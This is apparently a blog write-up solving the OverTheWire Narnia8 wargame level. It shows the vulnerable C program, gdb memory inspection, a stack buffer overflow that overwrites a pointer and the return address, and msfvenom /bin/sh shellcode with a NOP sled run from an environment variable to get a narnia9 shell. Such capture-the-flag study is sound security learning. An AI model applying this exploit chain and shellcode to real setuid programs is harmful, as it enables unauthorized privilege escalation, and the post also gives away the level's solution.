---
layout: post
title:  "Buffer Overflows: Narnia8"
date:   2017-06-27 13:34:50 -0400
categories: master
---

The source code:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am 
// making "i" global unti i find a fix 
// -morla 
int i; 

void func(char *b){
	char *blah=b;
	char bok[20];
	//int i=0;
	
	memset(bok, '\0', sizeof(bok));
	for(i=0; blah[i] != '\0'; i++)
		bok[i]=blah[i];

	printf("%s\n",bok);
}

int main(int argc, char **argv){
        
	if(argc > 1)       
		func(argv[1]);
	else    
	printf("%s argument\n", argv[0]);

	return 0;
}
```
The for loop is the interesting part and where a buffer overflow is possible. This code uses its own version of strcpy(), which will keep copying from `blah`, which is a copy of our input, into `bok` until it encounters a null byte, `0x00`.

```
(gdb) disass func
Dump of assembler code for function func:
   0x0804842d <+0>:	push   ebp
   0x0804842e <+1>:	mov    ebp,esp
   0x08048430 <+3>:	sub    esp,0x38
---snip---
   0x080484a0 <+115>:	mov    DWORD PTR [esp],0x8048580
   0x080484a7 <+122>:	call   0x80482f0 <printf@plt>
   0x080484ac <+127>:	leave  
   0x080484ad <+128>:	ret    
End of assembler dump.
```

Right before the printf function but after the for-loop looks to be a good place to create a breakpoint.

```
(gdb) break *func+122
Breakpoint 1 at 0x80484a7
(gdb) 
```
Let's do a test run.
```
(gdb) run $(python -c 'print "A"*19')
Starting program: /narnia/narnia8 $(python -c 'print "A"*19')

Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20xw $esp
0xffffd6c0:	0x08048580	0xffffd6d8[1]	0x00000014	0xf7e55fe3
0xffffd6d0:	0x00000000	0x002c307d	0x41414141[2]	0x41414141
0xffffd6e0:	0x41414141	0x41414141	0x00414141	0xffffd8e4[3]
0xffffd6f0:	0x00000002	0xffffd7b4	0xffffd718	0x080484cd[4]
0xffffd700:	0xffffd8e4[5]	0xf7ffd000	0x080484fb	0xf7fcc000

```
`[1]` is the location of `blok`, which points to `[2]`.

`[3]` is the location of `blah`:
```
(gdb) x/8xw 0xffffd8e4
0xffffd8e4:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8f4:	0x00414141	0x4c454853	0x622f3d4c	0x622f6e69
```

`[4]` is the return address that we need to overwrite:
```
(gdb) x/4i 0x080484cd
   0x80484cd <main+31>:	jmp    0x80484e4 <main+54>
   0x80484cf <main+33>:	mov    eax,DWORD PTR [ebp+0xc]
   0x80484d2 <main+36>:	mov    eax,DWORD PTR [eax]
   0x80484d4 <main+38>:	mov    DWORD PTR [esp+0x4],eax
(gdb) 
```
`[5]` is the parameter `char * b`. It points to the same address as `[3]` because of the line `char *blah=b;`.  `blah` and `b` are different pointers that point to the same memory address. 

If we let the program continue, it will print our buffer of A's.
```
(gdb) cont
Continuing.
AAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 77) exited normally]
(gdb) 
```
Let's try another buffer:
```
(gdb) run $(python -c 'print "A" * 20 + "BBBB"')
Starting program: /narnia/narnia8 $(python -c 'print "A" * 20 + "BBBB"')

Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20xw $esp
0xffffd6b0:	0x08048580	0xffffd6c8	0x00000014	0xf7e55fe3
0xffffd6c0:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0xffffd842[1]
0xffffd6e0:	0x00000002	0xffffd7a4	0xffffd708	0x080484cd
0xffffd6f0:	0xffffd8df[2]	0xf7ffd000	0x080484fb	0xf7fcc000
(gdb) cont
Continuing.
AAAAAAAAAAAAAAAAAAAAB���
[Inferior 1 (process 356) exited normally]
(gdb) 
```

Looking at the output, We see that part of the buffer was dropped, and replaced with non-ascii characters.
As stated previously, `[1]` points to `blah` and `blah` is being copied into `bok`:
```
for(i=0; blah[i] != '\0'; i++)
		bok[i]=blah[i];
```
The first B in our buffer overflowed into `blah`. Since we just butchered the memory address of `blah`, the code execution now gets a bit wonky.

When `i` was at 20, `bok[20]` pointed to the last byte of `blah`'s memory address while `blah[20]` pointed to the first B in our buffer.

```
bok[20]:
(gdb) x/8bx 0xffffd6c8 + 20
0xffffd6dc:	0x42	0xd8	0xff	0xff	0x02	0x00	0x00	0x00
```
```
blah[20]:
x/8bx 0xffffd8df + 20
0xffffd8f3:	0x42	0x42	0x42	0x42	0x00	0x53	0x48	0x45
```
B, or 0x42, gets copied into the last byte of `blah`, and `i` gets incremented to 21.
`bok[21]` now points to the second to last byte of `blah`'s memory address but `blah` now points to 0xffffd842, so `blah[21]` points to:
```
(gdb) x/2bx 0xffffd842 + 21
0xffffd857:	0x00	0x09
```
A null byte, which terminates the for-loop. That explains why the rest of our buffer doesn't get copied into `blok`.

Coincidentally, the next byte is 0x09, so if we change our B buffer to C, `blah` should be overwritten to 0xffff0943:
```
(gdb) run $(python -c 'print "A" * 20 + "CBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia8 $(python -c 'print "A" * 20 + "CBBB"')

Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20xw $esp
0xffffd6b0:	0x08048580	0xffffd6c8	0x00000014	0xf7e55fe3
0xffffd6c0:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0xffff0943[1]
0xffffd6e0:	0x00000002	0xffffd7a4	0xffffd708	0x080484cd
0xffffd6f0:	0xffffd8df[2]	0xf7ffd000	0x080484fb	0xf7fcc000
```
And it does.

So we need to find a way to overcome this road-block in order to overwrite the return address.

Recall that `[2]` is `char * b` which points to the exact same memory address as `blah` before it was butchered. So if we add this memory address to our buffer, we can essentially overwrite `blah` with its own memory address, meaning it doesn't get butchered, and the for-loop will continue copying the rest of buffer and we'll finally be able to overwrite the return address.

```
(gdb) run $(python -c 'print "A" * 20 + "\xdf\xd8\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia8 $(python -c 'print "A" * 20 + "\xdf\xd8\xff\xff"')

Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20xw $esp
0xffffd6b0:	0x08048580	0xffffd6c8	0x00000014	0xf7e55fe3
0xffffd6c0:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0xffffd8df
0xffffd6e0:	0x00000002	0xffffd7a4	0xffffd708	0x080484cd
0xffffd6f0:	0xffffd8df	0xf7ffd000	0x080484fb	0xf7fcc000
```

Our entire buffer buffer now gets loaded. Increasing the size of our buffer will modify the memory addresses, so we will have to find the correct address again after we increase our buffer:

With the previous address our buffer gets dropped again:
```
(gdb) run $(python -c 'print "A" * 20 + "\xdf\xd8\xff\xff" + "A"*12 +"ZZZZ"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia8 $(python -c 'print "A" * 20 + "\xdf\xd8\xff\xff" + "A"*12 +"ZZZZ"')

Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20xw $esp
0xffffd6a0:	0x08048580	0xffffd6b8	0x00000014	0xf7e55fe3
0xffffd6b0:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd6c0:	0x41414141	0x41414141	0x41414141	0xffff5adf
0xffffd6d0:	0x00000002	0xffffd794	0xffffd6f8	0x080484cd
0xffffd6e0:	0xffffd8cf[1]	0xf7ffd000	0x080484fb	0xf7fcc000

```
With the correct address pointed at `[1]`, our entire buffers gets copied and the return address gets overwritten:
```
(gdb) run $(python -c 'print "A" * 20 + "\xcf\xd8\xff\xff" + "A"*12 +"ZZZZ"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia8 $(python -c 'print "A" * 20 + "\xcf\xd8\xff\xff" + "A"*12 +"ZZZZ"')

Breakpoint 1, 0x080484a7 in func ()
(gdb) x/40xw $esp
0xffffd6a0:	0x08048580	0xffffd6b8	0x00000014	0xf7e55fe3
0xffffd6b0:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd6c0:	0x41414141	0x41414141	0x41414141	0xffffd8cf
0xffffd6d0:	0x41414141	0x41414141	0x41414141	0x5a5a5a5a[1]
0xffffd6e0:	0xffffd8cf	0xf7ffd000	0x080484fb	0xf7fcc000
---snip---
(gdb) cont
Continuing.
AAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAZZZZ����

Program received signal SIGSEGV, Segmentation fault.
0x5a5a5a5a in ?? ()
```
We've successfully overwritten the return address at `[1]`. Now we need to find a place to put in shellcode. As the buffer size is rather small, I opt to put the shellcode in an environmental variable.

Generating shellcode:
```
root@kali:~# msfvenom -p linux/x86/exec cmd=/bin/sh -f c -b '\x00\x20' -e x86/shikata_ga_nai
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of c file: 319 bytes
unsigned char buf[] = 
"\xda\xdd\xd9\x74\x24\xf4\xbb\x75\xaf\xf4\x7f\x5a\x31\xc9\xb1"
"\x0b\x83\xc2\x04\x31\x5a\x16\x03\x5a\x16\xe2\x80\xc5\xff\x27"
"\xf3\x48\x66\xb0\x2e\x0e\xef\xa7\x58\xff\x9c\x4f\x98\x97\x4d"
"\xf2\xf1\x09\x1b\x11\x53\x3e\x13\xd6\x53\xbe\x0b\xb4\x3a\xd0"
"\x7c\x4b\xd4\x2c\xd4\xf8\xad\xcc\x17\x7e";
```
I found that 0x20 would drop my buffer, so I include that as a bad character. I delete all the formatting and add a NOP slep, so the shellcode looks like:
```
root@kali:~# cat shellcode
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\xda\xdd\xd9\x74\x24\xf4\xbb\x75\xaf\xf4\x7f\x5a\x31\xc9\xb1
\x0b\x83\xc2\x04\x31\x5a\x16\x03\x5a\x16\xe2\x80\xc5\xff\x27
\xf3\x48\x66\xb0\x2e\x0e\xef\xa7\x58\xff\x9c\x4f\x98\x97\x4d
\xf2\xf1\x09\x1b\x11\x53\x3e\x13\xd6\x53\xbe\x0b\xb4\x3a\xd0
\x7c\x4b\xd4\x2c\xd4\xf8\xad\xcc\x17\x7e
```
Transfer that shellcode over to narnia:
```
narnia8@narnia:~$ echo '
> \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
> \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
> \xda\xdd\xd9\x74\x24\xf4\xbb\x75\xaf\xf4\x7f\x5a\x31\xc9\xb1
> \x0b\x83\xc2\x04\x31\x5a\x16\x03\x5a\x16\xe2\x80\xc5\xff\x27
> \xf3\x48\x66\xb0\x2e\x0e\xef\xa7\x58\xff\x9c\x4f\x98\x97\x4d
> \xf2\xf1\x09\x1b\x11\x53\x3e\x13\xd6\x53\xbe\x0b\xb4\x3a\xd0
> \x7c\x4b\xd4\x2c\xd4\xf8\xad\xcc\x17\x7e
> ' > /tmp/shellcode
narnia8@narnia:~$ 
```
Convert it to binary:
```
narnia8@narnia:~$ for line in $(cat /tmp/shellcode); do                            
> echo -en $line
> done > /tmp/shellcode.bin
narnia8@narnia:~$ cat /tmp/shellcode.bin
���������������������������������t$��u��Z1ɱ
                                           ��1ZZ����'�Hf�.��X��O��M��	S>�S�
                                                                                        �:�|K�,����~
```
And finally set it as an environmental variable:
```
narnia8@narnia:~$ export SHELLCODE=$(cat /tmp/shellcode.bin)
narnia8@narnia:~$ env
SHELLCODE=���������������������������������t$��u��Z1ɱ
                                                     ��1ZZ����'�Hf�.��X��O��M��	S>�S�
    �:�|K�,����~
TERM=xterm-256color
SHELL=/bin/bash
SSH_CLIENT=172.18.0.1 33590 22
SSH_TTY=/dev/pts/0
LC_ALL=C
USER=narnia8
---snip---
```
Adding an environmental variable also changes `blah`'s memory address, so in gdb, we need to once again find the new address.
```
run $(python -c 'print "A" * 20 + "\xcf\xd8\xff\xff" + "A"*12 +"ZZZZ"')
---snip---
Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20xw $esp
0xffffd630:	0x08048580	0xffffd648	0x00000014	0xf7e55fe3
0xffffd640:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd650:	0x41414141	0x41414141	0x41414141	0xffff53cf
0xffffd660:	0x00000002	0xffffd724	0xffffd688	0x080484cd
0xffffd670:	0xffffd861[1]	0xf7ffd000	0x080484fb	0xf7fcc000
(gdb) 

(gdb) run $(python -c 'print "A" * 20 + "\x61\xd8\xff\xff" + "A"*12 +"ZZZZ"')
---snip---
Breakpoint 1, 0x080484a7 in func ()
(gdb) x/20xw $esp
0xffffd630:	0x08048580	0xffffd648	0x00000014	0xf7e55fe3
0xffffd640:	0x00000000	0x002c307d	0x41414141	0x41414141
0xffffd650:	0x41414141	0x41414141	0x41414141	0xffffd861
0xffffd660:	0x41414141	0x41414141	0x41414141	0x5a5a5a5a
0xffffd670:	0xffffd861	0xf7ffd000	0x080484fb	0xf7fcc000
(gdb) cont
Continuing.
AAAAAAAAAAAAAAAAAAAAa���AAAAAAAAAAAAZZZZa���

Program received signal SIGSEGV, Segmentation fault.
0x5a5a5a5a in ?? ()
(gdb) 

```
So far so good. Now to find the address of the shellcode, which is a bit of a guessing game:
```
(gdb) x/24s $esp + 0x200
0xffffd870:	"AAAAAa\330\377\377", 'A' <repeats 12 times>, "ZZZZ"
0xffffd88a:	"SHELLCODE=", '\220' <repeats 30 times>, "\332\335\331t$\364\273u\257\364\177Z1\311\261\v\203\302\004\061Z\026\003Z\026\342\200\305\377'\363Hf\260.\016\357\247X\377\234O\230\227M\362\361\t\033\021S>\023\326S\276\v\264:\320|K\324,\324\370\255\314\027~"
0xffffd8f9:	"SHELL=/bin/bash"
0xffffd909:	"TERM=xterm-256color"
0xffffd91d:	"SSH_CLIENT=172.18.0.1 33590 22"
0xffffd93c:	"SSH_TTY=/dev/pts/0"
0xffffd94f:	"LC_ALL=C"
---snip---
(gdb) x/40xw 0xffffd88a
0xffffd88a:	0x4c454853	0x444f434c	0x90903d45	0x90909090
0xffffd89a:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8aa:	0x90909090	0x90909090	0x74d9ddda	0x75bbf424
0xffffd8ba:	0x5a7ff4af	0x0bb1c931	0x3104c283	0x5a03165a
0xffffd8ca:	0xc580e216	0x48f327ff	0x0e2eb066	0xff58a7ef
0xffffd8da:	0x97984f9c	0x09f1f24d	0x3e53111b	0xbe53d613
---snip---

(gdb) x/40xw 0xffffd894
0xffffd894:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd8a4:	0x90909090	0x90909090	0x90909090	0xddda9090
0xffffd8b4:	0xf42474d9	0xf4af75bb	0xc9315a7f	0xc2830bb1
0xffffd8c4:	0x165a3104	0xe2165a03	0x27ffc580	0xb06648f3
0xffffd8d4:	0xa7ef0e2e	0x4f9cff58	0xf24d9798	0x111b09f1
0xffffd8e4:	0xd6133e53	0xb40bbe53	0x4b7cd03a	0xf8d42cd4
---snip---
```
I choose 0xffffd894 as it's somewhere in the middle of the NOP sled and will give us some leeway on either side.
Replacing "ZZZZ" in our buffer with this address gives us a shell in gdb:
```
(gdb) run $(python -c 'print "A" * 20 + "\x61\xd8\xff\xff" + "A"*12 +"\x94\xd8\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia8 $(python -c 'print "A" * 20 + "\x61\xd8\xff\xff" + "A"*12 +"\x94\xd8\xff\xff"')

Breakpoint 1, 0x080484a7 in func ()
(gdb) cont
Continuing.
AAAAAAAAAAAAAAAAAAAAa���AAAAAAAAAAAA����a���
process 651 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "func" in current context.
Error in re-setting breakpoint 1: No symbol "func" in current context.
Error in re-setting breakpoint 1: No symbol "func" in current context.
$ 
```
Now comes the hardest part of this exercise: getting a shell outside of gdb. GDB itself changes the memory addresses, so now we'll need to find `blah`'s address without gdb's aid.

We won't have to do this completely blindly, but will require some manual fuzzing.

`hexdump` will output the hex values of whatever input it's given. We can use this to peek into the stack a little bit.
```
narnia8@narnia:~$ /narnia/narnia8 $(python -c 'print "A" * 20 + "\x61\xd8\xff\xff" + "B"*12 +"\x94\xd8\xff\xff"') | hexdump
0000000 4141 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 4161 ffff[1] 0a02 
```
We're currently have 0xffff4161 in the stack. The second byte was overwritten with 41, which means the address we have in our buffer is pointing to somewhere in our buffer of "A"'s.

Moving down the address space (towards higher memory addresses):
```
narnia8@narnia:~$ /narnia/narnia8 $(python -c 'print "A" * 20 + "\x70\xd8\xff\xff" + "B"*12 +"\x94\xd8\xff\xff"') | hexdump
0000000 4141 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 4170 ffff 0a02               

narnia8@narnia:~$ /narnia/narnia8 $(python -c 'print "A" * 20 + "\x71\xd8\xff\xff" + "B"*12 +"\x94\xd8\xff\xff"') | hexdump
0000000 4141 4141 4141 4141 4141 4141 4141 4141
0000010 4141 4141 7171[1] ffff 0a02 
```
That's interesting. We now have 0xffff7171. The first 0x71 gets placed onto the last byte of `blah` due to our buffer. `blok[21]` now ends up pointing to `\x71` in our buffer when it needs to point to `\xd8`, the next byte over.  
So  moving up one more byte should give us the correct address.
```
narnia8@narnia:~$ /narnia/narnia8 $(python -c 'print "A" * 20 + "\x72\xd8\xff\xff" + "B"*12 +"\x94\xd8\xff\xff"')          
AAAAAAAAAAAAAAAAAAAAr���BBBBBBBBBBBB����r���
Segmentation fault (core dumped)
```
It looks like it is. Now we'll have to fuzz the address of the shellcode.

```
narnia8@narnia:~$ /narnia/narnia8 $(python -c 'print "A" * 20 + "\x72\xd8\xff\xff" + "B"*12 +"\x93\xd8\xff\xff"')
AAAAAAAAAAAAAAAAAAAAr���BBBBBBBBBBBB����r���
$ whoami
narnia9
$    
```
Which wasn't too bad in this case.

[overthewire]: https://www.overthewire.org
